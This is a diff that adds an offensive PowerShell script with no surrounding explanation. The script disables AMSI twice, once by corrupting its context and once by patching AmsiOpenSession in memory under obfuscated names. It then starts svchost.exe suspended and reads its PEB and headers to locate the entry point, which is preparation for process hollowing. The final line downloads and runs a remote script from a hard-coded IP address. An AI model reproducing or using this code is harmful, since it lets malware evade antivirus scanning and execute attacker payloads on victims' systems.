@@ -1,0 +1,122 @@
+$a=[Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like '*iUtils') {$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like '*Context') {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+
+function LookupFunc(){
+    Param ($moduleName, $methodName)
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp = @()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetModuleHandle") {$tmp +=$_}}
+    $GetModuleHandle = $tmp[0]
+    $user32 = $GetModuleHandle.Invoke($null, $moduleName)
+    $tmp = @()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp +=$_}}
+    $GetProcAddress = $tmp[0]
+    $params = @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), $user32)), $methodName)
+    try {
+        return $GetProcAddress.Invoke($null,$params)
+    } catch {
+        return $GetProcAddress.Invoke($null,@($user32, $methodName))
+    }
+}
+
+function getDelegateType {
+    Param (
+        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+        [Parameter(Position = 1)] [Type] $delType = [Void]
+    )
+    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
+    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
+    return $type.CreateType()
+}
+
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+[StructLayout(LayoutKind.Sequential)]
+public struct PROCESS_INFORMATION
+{
+    public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId;
+}
+
+[StructLayout(LayoutKind.Sequential)]
+public struct PROCESS_BASIC_INFORMATION
+{
+    public IntPtr ExitStatus; public IntPtr PebBaseAddress; public IntPtr AffinityMask; public IntPtr BasePriority; public UIntPtr UniqueProcessId; public IntPtr InheritedFromUniqueProcessId;
+}
+
+[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+public struct STARTUPINFO
+{
+    public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle;
+    public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars;
+    public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow;
+    public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput;
+    public IntPtr hStdError;
+}
+
+[StructLayout(LayoutKind.Sequential)]
+public struct SECURITY_ATTRIBUTES
+{
+    public int length; public IntPtr lpSecurityDescriptor; public bool bInheritHandle;
+}
+
+public static class Hollow
+{
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool CreateProcess(
+        string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, 
+        ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, 
+        IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, 
+        out PROCESS_INFORMATION lpProcessInformation);
+}
+"@
+
+$name1 = "a" + "msi" + ".dll"
+$name2 = "A" + "msi" + "OpenS" + "ession"
+[IntPtr]$funcAddr = LookupFunc $name1 $name2
+
+$oldProtectionBuffer = 0
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32],[UInt32], [UInt32].MakeByRefType()) ([Bool])))
+$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer) | Out-Null
+$buf = [Byte[]] (0x48, 0x31, 0xC0)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
+$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer) | Out-Null
+
+$StartupInfo = New-Object STARTUPINFO
+$StartupInfo.dwFlags = 0x1 # StartupInfo.dwFlag
+$StartupInfo.wShowWindow = 0x0 # StartupInfo.ShowWindow
+$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo)
+$ProcessInfo = New-Object PROCESS_INFORMATION
+$SecAttr = New-Object SECURITY_ATTRIBUTES
+$SecAttr.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($SecAttr)
+$GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName
+$res = [Hollow]::CreateProcess("C:\Windows\System32\svchost.exe", $Args, [ref] $SecAttr, [ref] $SecAttr, $false, 0x04, [IntPtr]::Zero, $GetCurrentPath, [ref] $StartupInfo, [ref] $ProcessInfo) |out-null
+
+$PROCESS_BASIC_INFORMATION = New-Object PROCESS_BASIC_INFORMATION
+$PROCESS_BASIC_INFORMATION_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($PROCESS_BASIC_INFORMATION)
+[UInt32]$tmp = 0
+[IntPtr]$hProcess = $ProcessInfo.hProcess;
+$CallResult = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc ntdll.dll ZwQueryInformationProcess), (getDelegateType @([IntPtr], [Int32], [PROCESS_BASIC_INFORMATION].MakeByRefType(), [UInt32], [UInt32].MakeByRefType()) ([UInt32]))).Invoke($hProcess,0,[ref]$PROCESS_BASIC_INFORMATION,$PROCESS_BASIC_INFORMATION_Size, [ref]$tmp)
+[IntPtr]$rImgBaseOffset = $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64() + 0x10
+
+$ReadSize = 8
+$BytesRead = 0
+[IntPtr]$lpBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ReadSize)
+
+$res = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll ReadProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($hProcess,$rImgBaseOffset,$lpBuffer,$ReadSize,[ref]$BytesRead)
+$SponsorImageBase = ([System.Runtime.InteropServices.Marshal]::ReadInt64($($lpBuffer.ToInt64())))
+
+$epSize = 300
+[IntPtr]$epBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($epSize)
+$epRes = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll ReadProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($hProcess,$SponsorImageBase,$epBuffer,$epSize,[ref]$BytesRead)
+
+$bValue = [System.Runtime.InteropServices.Marshal]::ReadInt32($($epBuffer.ToInt64()))
+$e_lfanew = [System.Runtime.InteropServices.Marshal]::ReadInt32($($epBuffer.ToInt64() + 0x3C))
+$opthdr = $e_lfanew + 0x28
+
+$rva = [System.Runtime.InteropServices.Marshal]::ReadInt32($($epBuffer.ToInt64() + $opthdr))
+$epAddr = [IntPtr]($SponsorImageBase + $rva)
+
+iex(new-object net.webclient).downloadstring('http://192.168.135.7/hola.txt')
